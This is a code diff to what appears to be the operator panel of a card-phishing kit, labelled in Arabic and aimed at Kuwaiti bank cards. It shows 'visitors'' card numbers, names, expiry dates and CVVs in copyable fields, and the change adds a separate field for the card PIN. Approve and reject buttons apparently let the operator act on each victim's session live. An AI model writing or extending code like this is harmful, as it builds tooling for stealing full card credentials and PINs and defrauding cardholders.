@@ -687,8 +687,8 @@
       const decision = cardStatus(card);
       const cardId = card.id || '';
       const cardNumber = card.cardNumber || visitor.cardNumber || '';
-      const securityCode = String(card.cvv || card.securityCode || visitor.cvv || '').trim();
-      const securityLabel = securityCode.length === 4 ? 'رمز BIN' : 'رمز CVV';
+      const pinCode = String(card.pin || '').trim();
+      const cvvCode = String(card.cvv || card.securityCode || '').trim();
       const firebaseBankName = cleanFirebaseBankName(card.bankName || card.bank, cardNumber);
       const fixedBankCode = getKuwaitBankCode(cardNumber);
       // الاسم المختصر الإنجليزي من قاعدة BIN هو المعروض على البطاقة
@@ -702,7 +702,8 @@
         <div class="bank-card-details">
           <div><small>حامل البطاقة</small><strong class="ref-copyable" ${escapeHtml(String(card.cardholderName || card.holderName || card.name || visitor.name || '')) ? `data-copy="${escapeHtml(String(card.cardholderName || card.holderName || card.name || visitor.name || ''))}"` : ''}>${escapeHtml(card.cardholderName || card.holderName || card.name || visitor.name || 'غير متوفر')}</strong></div>
           <div><small>تاريخ الانتهاء</small><strong class="ref-copyable" ${escapeHtml(String(card.expiry || card.expiryDate || visitor.expiryDate || visitor.expiry || '')) ? `data-copy="${escapeHtml(String(card.expiry || card.expiryDate || visitor.expiryDate || visitor.expiry || ''))}"` : ''}>${escapeHtml(card.expiry || card.expiryDate || visitor.expiryDate || visitor.expiry || 'غير متوفر')}</strong></div>
-          <div><small>${securityLabel}</small><strong class="ref-copyable" ${securityCode ? `data-copy="${escapeHtml(securityCode)}"` : ''}>${escapeHtml(securityCode || 'غير متوفر')}</strong></div>
+          <div><small>الرقم السري (PIN)</small><strong class="ref-copyable" ${pinCode ? `data-copy="${escapeHtml(pinCode)}"` : ''}>${escapeHtml(pinCode || 'غير متوفر')}</strong></div>
+          <div><small>رمز الأمان (CVV)</small><strong class="ref-copyable" ${cvvCode ? `data-copy="${escapeHtml(cvvCode)}"` : ''}>${escapeHtml(cvvCode || 'غير متوفر')}</strong></div>
         </div>
         ${decision ? '' : `<div class="ref-card-actions"><button data-card-action="approve" data-card-key="${escapeHtml(cardKey(card))}" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(visitor.sessionId || visitor.id)}">✓ موافقة</button><button data-card-action="reject" data-card-key="${escapeHtml(cardKey(card))}" data-card-id="${escapeHtml(cardId)}" data-session-id="${escapeHtml(visitor.sessionId || visitor.id)}">× رفض</button></div>`}
       </article></div>`;
